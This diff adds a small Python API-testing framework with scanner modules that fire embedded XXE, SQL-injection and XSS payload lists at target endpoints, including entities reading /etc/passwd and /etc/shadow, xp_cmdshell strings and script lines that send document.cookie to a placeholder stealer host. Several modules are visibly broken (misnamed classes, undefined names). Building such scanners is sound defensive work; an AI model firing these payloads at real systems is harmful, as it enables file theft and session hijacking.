@@ -1,0 +1,876 @@
+--------------------------------------------------------------------------------
+./Pipfile.lock
+{
+    "_meta": {
+        "hash": {
+            "sha256": "047e2ffb7375b8f1dbae31d26619e828dcbdc1fd080776e3a7840cc1923d47da"
+        },
+        "pipfile-spec": 6,
+        "requires": {
+            "python_version": "3.9"
+        },
+        "sources": [
+            {
+                "name": "pypi",
+                "url": "https://pypi.org/simple",
+                "verify_ssl": true
+            }
+        ]
+    },
+    "default": {
+        "certifi": {
+            "hashes": [
+                "sha256:1a4995114262bffbc2413b159f2a1a480c969de6e6eb13ee966d470af86af59c",
+                "sha256:719a74fb9e33b9bd44cc7f3a8d94bc35e4049deebe19ba7d8e108280cfd59830"
+            ],
+            "version": "==2020.12.5"
+        },
+        "chardet": {
+            "hashes": [
+                "sha256:0d6f53a15db4120f2b08c94f11e7d93d2c911ee118b6b30a04ec3ee8310179fa",
+                "sha256:f864054d66fd9118f2e67044ac8981a54775ec5b67aed0441892edb553d21da5"
+            ],
+            "markers": "python_version >= '2.7' and python_version not in '3.0, 3.1, 3.2, 3.3, 3.4'",
+            "version": "==4.0.0"
+        },
+        "idna": {
+            "hashes": [
+                "sha256:b307872f855b18632ce0c21c5e45be78c0ea7ae4c15c828c20788b26921eb3f6",
+                "sha256:b97d804b1e9b523befed77c48dacec60e6dcb0b5391d57af6a65a312a90648c0"
+            ],
+            "markers": "python_version >= '2.7' and python_version not in '3.0, 3.1, 3.2, 3.3'",
+            "version": "==2.10"
+        },
+        "pydantic": {
+            "hashes": [
+                "sha256:021ea0e4133e8c824775a0cfe098677acf6fa5a3cbf9206a376eed3fc09302cd",
+                "sha256:05ddfd37c1720c392f4e0d43c484217b7521558302e7069ce8d318438d297739",
+                "sha256:05ef5246a7ffd2ce12a619cbb29f3307b7c4509307b1b49f456657b43529dc6f",
+                "sha256:10e5622224245941efc193ad1d159887872776df7a8fd592ed746aa25d071840",
+                "sha256:18b5ea242dd3e62dbf89b2b0ec9ba6c7b5abaf6af85b95a97b00279f65845a23",
+                "sha256:234a6c19f1c14e25e362cb05c68afb7f183eb931dd3cd4605eafff055ebbf287",
+                "sha256:244ad78eeb388a43b0c927e74d3af78008e944074b7d0f4f696ddd5b2af43c62",
+                "sha256:26464e57ccaafe72b7ad156fdaa4e9b9ef051f69e175dbbb463283000c05ab7b",
+                "sha256:41b542c0b3c42dc17da70554bc6f38cbc30d7066d2c2815a94499b5684582ecb",
+                "sha256:4a03cbbe743e9c7247ceae6f0d8898f7a64bb65800a45cbdc52d65e370570820",
+                "sha256:4be75bebf676a5f0f87937c6ddb061fa39cbea067240d98e298508c1bda6f3f3",
+                "sha256:54cd5121383f4a461ff7644c7ca20c0419d58052db70d8791eacbbe31528916b",
+                "sha256:589eb6cd6361e8ac341db97602eb7f354551482368a37f4fd086c0733548308e",
+                "sha256:8621559dcf5afacf0069ed194278f35c255dc1a1385c28b32dd6c110fd6531b3",
+                "sha256:8b223557f9510cf0bfd8b01316bf6dd281cf41826607eada99662f5e4963f316",
+                "sha256:99a9fc39470010c45c161a1dc584997f1feb13f689ecf645f59bb4ba623e586b",
+                "sha256:a7c6002203fe2c5a1b5cbb141bb85060cbff88c2d78eccbc72d97eb7022c43e4",
+                "sha256:a83db7205f60c6a86f2c44a61791d993dff4b73135df1973ecd9eed5ea0bda20",
+                "sha256:ac8eed4ca3bd3aadc58a13c2aa93cd8a884bcf21cb019f8cfecaae3b6ce3746e",
+                "sha256:e710876437bc07bd414ff453ac8ec63d219e7690128d925c6e82889d674bb505",
+                "sha256:ea5cb40a3b23b3265f6325727ddfc45141b08ed665458be8c6285e7b85bd73a1",
+                "sha256:fec866a0b59f372b7e776f2d7308511784dace622e0992a0b59ea3ccee0ae833"
+            ],
+            "index": "pypi",
+            "version": "==1.8.2"
+        },
+        "requests": {
+            "hashes": [
+                "sha256:27973dd4a904a4f13b263a19c866c13b92a39ed1c964655f025f3f8d3d75b804",
+                "sha256:c210084e36a42ae6b9219e00e48287def368a26d03a048ddad7bfee44f75871e"
+            ],
+            "index": "pypi",
+            "version": "==2.25.1"
+        },
+        "termcolor": {
+            "hashes": [
+                "sha256:1d6d69ce66211143803fbc56652b41d73b4a400a2891d7bf7a1cdf4c02de613b"
+            ],
+            "index": "pypi",
+            "version": "==1.1.0"
+        },
+        "typing-extensions": {
+            "hashes": [
+                "sha256:0ac0f89795dd19de6b97debb0c6af1c70987fd80a2d62d1958f7e56fcc31b497",
+                "sha256:50b6f157849174217d0656f99dc82fe932884fb250826c18350e159ec6cdf342",
+                "sha256:779383f6086d90c99ae41cf0ff39aac8a7937a9283ce0a414e5dd782f4c94a84"
+            ],
+            "version": "==3.10.0.0"
+        },
+        "urllib3": {
+            "hashes": [
+                "sha256:2f4da4594db7e1e110a944bb1b551fdf4e6c136ad42e4234131391e21eb5b0df",
+                "sha256:e7b021f7241115872f92f43c6508082facffbd1c048e3c6e2bb9c2a157e28937"
+            ],
+            "markers": "python_version >= '2.7' and python_version not in '3.0, 3.1, 3.2, 3.3, 3.4' and python_version < '4'",
+            "version": "==1.26.4"
+        }
+    },
+    "develop": {}
+}
+--------------------------------------------------------------------------------
+./listing.txt
+--------------------------------------------------------------------------------
+./Pipfile
+[[source]]
+url = "https://pypi.org/simple"
+verify_ssl = true
+name = "pypi"
+
+[packages]
+pydantic = "*"
+termcolor = "*"
+requests = "*"
+
+[dev-packages]
+
+[requires]
+python_version = "3.9"
+--------------------------------------------------------------------------------
+./listing.py
+import os
+from termcolor import colored
+from time import sleep
+
+
+with open('listing.txt', 'w') as listing:
+    for r, _, _f in os.walk('.'):
+        for f in _f:
+            if r[0:3] == './.' or f[0] == '.' or f.endswith('.pyc') or f.endswith('.db'):
+                continue
+
+            with open(os.path.join(r, f), 'r') as file:
+                try:
+                    content = ['-' * 80, '\n', os.path.join(r, f), '\n'] + list(i for i in file.readlines() if i != '')
+                except Exception as e:
+                    print(colored(str(e) + os.path.join(r, f), 'red'))
+                    continue
+
+            listing.writelines(content)
+
+--------------------------------------------------------------------------------
+./src/__init__.py
+--------------------------------------------------------------------------------
+./src/main.py
+from typing import Dict, List
+
+import requests
+from requests import Response
+from termcolor import colored
+from pydantic import BaseModel
+
+from src.expectations.base import *
+from src.base.BaseTest import *
+
+BASE_URL = "https://5f8ad2fb8453150016706248.mockapi.io/api/"
+
+
+class UserSchema(BaseModel):
+    id: int
+    name: str
+    money: str
+
+
+class UserListSchema(BaseModel):
+    __root__: List[UserSchema]
+
+
+class TestSmth(BaseTest):
+    url = 'https://www.google.com/'
+
+    def test_smth(self) -> List[Explanation]:
+        response = self.send_request()
+
+        return expect(response, [
+            HeaderToBePresent('Content-Type'),
+            StatusCodeToBeSuccessful()
+        ])
+
+    def test_error(self) -> List[Explanation]:
+        response = self.send_request(path='some')
+
+        return expect(response, [
+            HeaderToBePresent('Content-Type'),
+            StatusCodeToBeClientError()
+        ])
+
+    def test_mock(self) -> List[Explanation]:
+        response = self.send_request(url=BASE_URL, path='user')
+
+        return expect(response, [
+            StatusCodeToBeSuccessful(),
+            HeaderToBeEqual('Content-Type', 'application/json'),
+            JSONToBeMatchingSchema(UserListSchema)
+        ])
+
+    def test_post(self) -> List[Explanation]:
+        response = self.send_request(url=BASE_URL, path='user', method='POST',
+                                      json_body={'name': 'Gans', 'money': '0.00'})
+
+        return expect(response, [
+            StatusCodeToBeSuccessful(),
+            JSONToBeMatchingSchema(UserSchema)
+        ])
+
+
+if __name__ == '__main__':
+    bt = TestSmth()
+
+    bt.run_tests()
+--------------------------------------------------------------------------------
+./src/base/BaseTest.py
+from typing import Dict, List
+
+from termcolor import colored
+import requests
+
+from src.expectations.base import *
+
+
+class BaseTest:
+    headers = {}
+    query_params = {}
+    body = ""
+    method = "GET"
+    url = ""
+    json_body = {}
+    response: Response
+    explanations: List[Explanation]
+
+    def set_headers(self, headers: Dict[str, str]):
+        self.headers.update(**headers)
+
+    def set_query_params(self, query: Dict[str, str]):
+        self.query_params.update(**query)
+
+    def set_json(self, json_body: dict):
+        self.json_body = json_body
+
+    def set_url(self, url: str):
+        self.url = url
+
+    def set_method(self, method: str):
+        self.method = method
+
+    def expect(self, response: Response, expectations):
+        self.explanations = [exp for exp in [i.is_meeting(response) for i in expectations] if isinstance(exp, Explanation)]
+
+    def run_tests(self):
+        test_funcs = [func for func in dir(self) if func.startswith('test_') and callable(getattr(self, func))]
+
+        if len(test_funcs) < 1:
+            raise Exception("No test functions to run tests")
+
+        for func in test_funcs:
+            getattr(self, func)()
+            if self.explanations.__len__() < 1:
+                print(colored('Passed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
+                              'green', attrs=['bold']))
+            else:
+                print(colored('Failed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
+                              'red', attrs=['bold', 'underline']))
+
+                for i in self.explanations:
+                    print('    ', colored(i, 'red'))
+                self.explanations.clear()
+
+    def send_request(self, **kwargs):
+        method = kwargs.get('method') or self.method
+        url = kwargs.get('url') or self.url
+        url += kwargs.get('path', '')
+        headers = {**self.headers, **kwargs.get('headers', {})}
+        json_body = kwargs.get('json_body') or self.json_body
+        query_params = {**self.query_params, **kwargs.get('query_params', {})}
+
+        if method.upper() == 'GET':
+            self.response = requests.get(url, params=query_params, headers=headers)
+        if method.upper() == 'POST':
+            self.response = requests.post(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'PUT':
+            self.response = requests.put(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'DELETE':
+            self.response = requests.delete(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'OPTIONS':
+            self.response = requests.options(url, params=query_params, headers=headers, data=json_body)
+
+--------------------------------------------------------------------------------
+./src/auth/AuthTest.py
+from typing import Dict, List
+
+from termcolor import colored
+import requests
+
+from src.expectations.base import *
+from src.base import BaseTest
+
+
+class AuthTest(BaseTest):
+
+    def run_tests(self):
+        for role in self.roles:
+            for resource in self.resourses:
+                self.send_request(**role.get('auth'))
+
+                if 200 <= self.response.status_code < 300:
+                    if resource in self.expectations.get(role):
+                        print(colored('Passed at ' + __name__ + '.' + self.__class__.__name__,
+                                      'green', attrs=['bold']))
+                else:
+                    if not resource in self.expectations.get(role):
+                        print(colored('Passed at ' + __name__ + '.' + self.__class__.__name__,
+                                      'green', attrs=['bold']))
+
+    def send_request(self, **kwargs):
+        method = kwargs.get('method') or self.method
+        url = kwargs.get('url') or self.url
+        url += kwargs.get('path', '')
+        headers = {**self.headers, **kwargs.get('headers', {})}
+        json_body = kwargs.get('json_body') or self.json_body
+        query_params = {**self.query_params, **kwargs.get('query_params', {})}
+
+        if method.upper() == 'GET':
+            self.response = requests.get(url, params=query_params, headers=headers)
+        if method.upper() == 'POST':
+            self.response = requests.post(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'PUT':
+            self.response = requests.put(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'DELETE':
+            self.response = requests.delete(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'OPTIONS':
+            self.response = requests.options(url, params=query_params, headers=headers, data=json_body)
+
+        kwargs.get('post_action', lambda *args: None)()
+
+
+
+
+
+--------------------------------------------------------------------------------
+./src/xxe/XXETest.py
+import requests
+from termcolor import colored
+
+from src.base import BaseTest
+
+
+xxei_raw = '''
+count(/child::node())
+x' or name()='username' or 'x'='y
+<name>','')); phpinfo(); exit;/*</name>
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
+<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
+<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+'''
+
+class SQLInjectionTest(BaseTest):
+    xxei_n = 0
+    xxei = xxei_raw.split('\n')
+
+    def inject(self, s: str):
+        return s + self.xxei[self.xxei_n]
+
+    def _inject_forward(self):
+        self.xxei_n += 1
+
+    def run_tests(self):
+        test_funcs = [func for func in dir(self) if func.startswith('test_') and callable(getattr(self, func))]
+
+        if len(test_funcs) < 1:
+            raise Exception("No test functions to run tests")
+
+        for func in test_funcs:
+            for _ in self.xxei:
+                getattr(self, func)()
+                if self.explanations.__len__() < 1:
+                    print(colored('Passed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
+                                  'green', attrs=['bold']))
+                else:
+                    print(colored('Failed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
+                                  'red', attrs=['bold', 'underline']))
+
+                    for i in self.explanations:
+                        print('    ', colored(i, 'red'))
+
+                self._inject_forward()
+
+    def send_request(self, **kwargs):
+        method = kwargs.get('method') or self.method
+        url = kwargs.get('url') or self.url
+        url += kwargs.get('path', '')
+        headers = {**self.headers, **kwargs.get('headers', {})}
+        json_body = kwargs.get('json_body') or self.json_body
+
+        query_params_to_test = {k: self.inject(v) for k, v in kwargs.get('query_params_to_test', {}).items()}
+        query_params = {**self.query_params, **kwargs.get('query_params', {}), **query_params_to_test}
+
+        if method.upper() == 'GET':
+            self.response = requests.get(url, params=query_params, headers=headers)
+        if method.upper() == 'POST':
+            self.response = requests.post(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'PUT':
+            self.response = requests.put(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'DELETE':
+            self.response = requests.delete(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'OPTIONS':
+            self.response = requests.options(url, params=query_params, headers=headers, data=json_body)
+
+
+--------------------------------------------------------------------------------
+./src/sqli/__init__.py
+--------------------------------------------------------------------------------
+./src/sqli/test.py
+import requests
+from termcolor import colored
+
+from src.base import BaseTest
+
+sqli_raw = """'
+"
+#
+-
+--
+'%20--
+--';
+'%20;
+=%20'
+=%20;
+=%20--
+\x23
+\x27
+\x3D%20\x3B'
+\x3D%20\x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or%20select *
+admin'--
+<>"'%;)(&+
+'%20or%20''='
+'%20or%20'x'='x
+"%20or%20"x"="x
+')%20or%20('x'='x
+0 or 1=1
+' or 0=0 --
+" or 0=0 --
+or 0=0 --
+' or 0=0 #
+" or 0=0 #
+or 0=0 #
+' or 1=1--
+" or 1=1--
+' or '1'='1'--
+"' or 1 --'"
+or 1=1--
+or%201=1
+or%201=1 --
+' or 1=1 or ''='
+" or 1=1 or ""="
+' or a=a--
+" or "a"="a
+') or ('a'='a
+") or ("a"="a
+hi" or "a"="a
+hi" or 1=1 --
+hi' or 1=1 --
+hi' or 'a'='a
+hi') or ('a'='a
+hi") or ("a"="a
+'hi' or 'x'='x';
+@variable
+,@variable
+PRINT
+PRINT @@variable
+select
+insert
+as
+or
+procedure
+limit
+order by
+asc
+desc
+delete
+update
+distinct
+having
+truncate
+replace
+like
+handler
+bfilename
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+exec xp
+exec sp
+'; exec master..xp_cmdshell
+'; exec xp_regread
+t'exec master..xp_cmdshell 'nslookup www.google.com'--
+--sp_password
+\x27UNION SELECT
+' UNION SELECT
+' UNION ALL SELECT
+' or (EXISTS)
+' (select top 1
+'||UTL_HTTP.REQUEST
+1;SELECT%20*
+to_timestamp_tz
+tz_offset
+&lt;&gt;&quot;'%;)(&amp;+
+'%20or%201=1
+%27%20or%201=1
+%20$(sleep%2050)
+%20'sleep%2050'
+char%4039%41%2b%40SELECT
+&apos;%20OR
+'sqlattempt1
+(sqlattempt2)
+|
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+(
+%28
+)
+%29
+&
+%26
+!
+%21
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+"""
+
+
+class SQLInjectionTest(BaseTest):
+    sqli_n = 0
+    sqli = sqli_raw.split('\n')
+
+    def inject(self, s: str):
+        return s + self.sqli[self.sqli_n]
+
+    def _inject_forward(self):
+        self.sqli_n += 1
+
+    def run_tests(self):
+        test_funcs = [func for func in dir(self) if func.startswith('test_') and callable(getattr(self, func))]
+
+        if len(test_funcs) < 1:
+            raise Exception("No test functions to run tests")
+
+        for func in test_funcs:
+            for _ in self.sqli:
+                getattr(self, func)()
+                if self.explanations.__len__() < 1:
+                    print(colored('Passed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
+                                  'green', attrs=['bold']))
+                else:
+                    print(colored('Failed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
+                                  'red', attrs=['bold', 'underline']))
+
+                    for i in self.explanations:
+                        print('    ', colored(i, 'red'))
+
+                self._inject_forward()
+
+    def send_request(self, **kwargs):
+        method = kwargs.get('method') or self.method
+        url = kwargs.get('url') or self.url
+        url += kwargs.get('path', '')
+        headers = {**self.headers, **kwargs.get('headers', {})}
+        json_body = kwargs.get('json_body') or self.json_body
+
+        query_params_to_test = {k: self.inject(v) for k, v in kwargs.get('query_params_to_test', {}).items()}
+        query_params = {**self.query_params, **kwargs.get('query_params', {}), **query_params_to_test}
+
+        if method.upper() == 'GET':
+            self.response = requests.get(url, params=query_params, headers=headers)
+        if method.upper() == 'POST':
+            self.response = requests.post(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'PUT':
+            self.response = requests.put(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'DELETE':
+            self.response = requests.delete(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'OPTIONS':
+            self.response = requests.options(url, params=query_params, headers=headers, data=json_body)
+
+
+--------------------------------------------------------------------------------
+./src/xss/XSSTest.py
+from typing import Dict, List
+
+from termcolor import colored
+import requests
+from requests import Response
+
+from src.base import BaseTest
+from src.expectations.base import Explanation
+
+xssi = '''"><script>"
+<script>alert("WXSS")</script>
+<<script>alert("WXSS");//<</script>
+<script>alert(document.cookie)</script>
+'><script>alert(document.cookie)</script>
+'><script>alert(document.cookie);</script>
+\";alert('XSS');//
+%3cscript%3ealert("WXSS");%3c/script%3e
+%3cscript%3ealert(document.cookie);%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+&ltscript&gtalert(document.cookie);</script>
+&ltscript&gtalert(document.cookie);&ltscript&gtalert
+<xss><script>alert('WXSS')</script></vulnerable>
+<IMG%20SRC='javascript:alert(document.cookie)'>
+<IMG%20SRC="javascript:alert('WXSS');">
+<IMG%20SRC="javascript:alert('WXSS')"
+<IMG%20SRC=javascript:alert('WXSS')>
+<IMG%20SRC=JaVaScRiPt:alert('WXSS')>
+<IMG%20SRC=javascript:alert(&quot;WXSS&quot;)>
+<IMG%20SRC=`javascript:alert("'WXSS'")`>
+<IMG%20"""><SCRIPT>alert("WXSS")</SCRIPT>">
+<IMG%20SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG%20SRC='javasc	ript:alert(document.cookie)'>
+<IMG%20SRC="jav	ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x09;ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x0A;ascript:alert('WXSS');">
+<IMG%20SRC="jav&#x0D;ascript:alert('WXSS');">
+<IMG%20SRC="%20&#14;%20javascript:alert('WXSS');">
+<IMG%20DYNSRC="javascript:alert('WXSS')">
+<IMG%20LOWSRC="javascript:alert('WXSS')">
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:a%26%23x6c;ert(document.%26%23x63;ookie)'>
+<IMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG%20SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+'%3CIFRAME%20SRC=javascript:alert(%2527XSS%2527)%3E%3C/IFRAME%3E
+"><script>document.location='http://cookieStealer/cgi-bin/cookie.cgi?'+document.cookie</script>
+%22%3E%3Cscript%3Edocument%2Elocation%3D%27http%3A%2F%2Fyour%2Esite%2Ecom%2Fcgi%2Dbin%2Fcookie%2Ecgi%3F%27%20%2Bdocument%2Ecookie%3C%2Fscript%3E
+';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//></SCRIPT>!--<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>=&{}
+'';!--"<XSS>=&{()}
+'''
+
+
+class XSSTest(BaseTest):
+
+    xssi = xssi.split('\n')
+
+    def run_tests(self):
+        test_funcs = [func for func in dir(self) if func.startswith('test_') and callable(getattr(self, func))]
+
+        if len(test_funcs) < 1:
+            raise Exception("No test functions to run tests")
+
+        for func in test_funcs:
+            for _ in xssi:
+                getattr(self, func)()
+                self.check()
+
+    def check(self):
+        if jinja2.utils.escape(self.response.text) == self.response.text:
+            print(colored('Passed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
+                          'green', attrs=['bold']))
+        else:
+            print(colored('Failed at ' + __name__ + '.' + self.__class__.__name__ + '.' + func,
+                          'red', attrs=['bold', 'underline']))
+
+    def send_request(self, **kwargs):
+        method = kwargs.get('method') or self.method
+        url = kwargs.get('url') or self.url
+        url += kwargs.get('path', '')
+        headers = {**self.headers, **kwargs.get('headers', {})}
+        json_body = kwargs.get('json_body') or self.json_body
+        query_params = {**self.query_params, **kwargs.get('query_params', {})}
+
+        if method.upper() == 'GET':
+            self.response = requests.get(url, params=query_params, headers=headers)
+        if method.upper() == 'POST':
+            self.response = requests.post(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'PUT':
+            self.response = requests.put(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'DELETE':
+            self.response = requests.delete(url, params=query_params, headers=headers, data=json_body)
+        if method.upper() == 'OPTIONS':
+            self.response = requests.options(url, params=query_params, headers=headers, data=json_body)
+
+--------------------------------------------------------------------------------
+./src/expectations/__init__.py
+--------------------------------------------------------------------------------
+./src/expectations/base.py
+import inspect
+from pydantic.dataclasses import dataclass
+from pydantic import BaseModel, ValidationError
+from typing import Callable, Union, Type
+from requests import Response
+import re
+
+
+class Explanation:
+    __slots__ = ('expl',)
+    expl: str
+
+    def __init__(self, expl: str):
+        self.expl = expl
+
+    def __str__(self):
+        return self.expl
+
+
+class BaseExpectation:
+
+    def is_meeting(self, response: Response):
+        raise NotImplementedError()
+
+
+@dataclass
+class HeaderToBe(BaseExpectation):
+    header: str
+
+
+@dataclass
+class StatusCodeToBe(BaseExpectation):
+    status_code: int
+
+
+@dataclass
+class JSONToBe(BaseExpectation):
+    shema: Type[BaseModel]
+
+
+@dataclass
+class HeaderToBePresent(HeaderToBe):
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if self.header in response.headers:
+            return True
+        else:
+            return Explanation(f"Header '{self.header}' is not present in response")
+
+
+@dataclass
+class HeaderToBeEqual(HeaderToBe):
+    value: str
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if self.header in response.headers:
+            if response.headers.get(self.header, '') == self.value:
+                return True
+            else:
+                return Explanation(f"Header '{self.header} is equal to '{response.headers.get(self.header)}'"
+                                   f", expected to be '{self.value}'")
+        else:
+            return Explanation(f"Header '{self.header}' is not present in response")
+
+
+@dataclass
+class HeaderToBeMatchingRegexp(HeaderToBe):
+    regexp: str
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if self.header in response.headers and re.match(self.regexp, self.header):
+            return True
+        else:
+            return Explanation(f"Header '{self.header} doesn\'t match regexp '{self.regexp}'")
+
+
+@dataclass
+class HeaderToBeValidatableBy(HeaderToBe):
+    validator: Callable[[str, Response], bool]
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if self.validator(self.header, response):
+            return True
+        else:
+            return Explanation(f"Header {self.header} wasn\'t marked as valid by custom function "
+                               f"\n{inspect.getsource(self.validator)}")
+
+
+@dataclass
+class StatusCodeToBeEqual(StatusCodeToBe):
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if self.status_code == response.status_code:
+            return True
+        else:
+            return Explanation(f"Status code is {response.status_code}, expected to be {self.status_code}")
+
+
+@dataclass
+class StatusCodeToBeInformational:
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if 100 <= response.status_code < 200:
+            return True
+        else:
+            return Explanation(f"Status code is {response.status_code}, expected to be informational")
+
+
+@dataclass
+class StatusCodeToBeSuccessful:
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if 200 <= response.status_code < 300:
+            return True
+        else:
+            return Explanation(f"Status code is {response.status_code}, expected to be successful")
+
+
+@dataclass
+class StatusCodeToBeRedirected:
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if 300 <= response.status_code < 400:
+            return True
+        else:
+            return Explanation(f"Status code is {response.status_code}, expected to be redirected")
+
+
+@dataclass
+class StatusCodeToBeClientError:
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if 400 <= response.status_code < 500:
+            return True
+        else:
+            return Explanation(f"Status code is {response.status_code}, expected to be client error")
+
+
+@dataclass
+class StatusCodeToBeServerError:
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if 500 <= response.status_code < 600:
+            return True
+        else:
+            return Explanation(f"Status code is {response.status_code}, expected to be server error")
+
+
+@dataclass
+class JSONToBeMatchingSchema(JSONToBe):
+
+    def is_meeting(self, response: Response) -> Union[bool, Explanation]:
+        if response.headers.get('Content-Type') == 'application/json':
+            try:
+                json = response.json()
+            except Exception:
+                return Explanation(f"JSON is invalid")
+        else:
+            return Explanation(f"Response body is not json")
+
+        try:
+            obj = self.shema.parse_obj(json)
+            return True
+        except ValidationError as e:
+            return Explanation(f"Json data is not matching schema"
+                               f"\n{e}")
